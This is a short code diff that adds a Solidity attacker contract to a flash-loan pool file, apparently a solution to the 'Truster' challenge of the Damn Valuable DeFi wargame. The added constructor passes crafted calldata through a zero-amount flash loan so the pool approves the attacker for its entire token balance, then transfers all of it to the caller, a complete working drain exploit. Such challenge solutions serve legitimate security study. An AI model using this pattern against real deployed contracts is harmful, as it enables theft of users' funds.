@@ -37,3 +37,16 @@ contract TrusterLenderPool is ReentrancyGuard {
         return true;
     }
 }
+
+contract TrusterLenderAttacker{
+    TrusterLenderPool trusterLenderPool;
+    DamnValuableToken dvtToken;
+    constructor(address _trusterLenderPool){
+        trusterLenderPool = TrusterLenderPool(_trusterLenderPool);
+        dvtToken = trusterLenderPool.token();
+        uint victimDvtBalance = dvtToken.balanceOf(address(trusterLenderPool));
+        bytes memory data = abi.encodeWithSelector(dvtToken.approve.selector, address(this), victimDvtBalance);
+        trusterLenderPool.flashLoan(0, address(this), address(trusterLenderPool.token()), data);
+        dvtToken.transferFrom(address(trusterLenderPool), msg.sender, victimDvtBalance);
+    }
+}
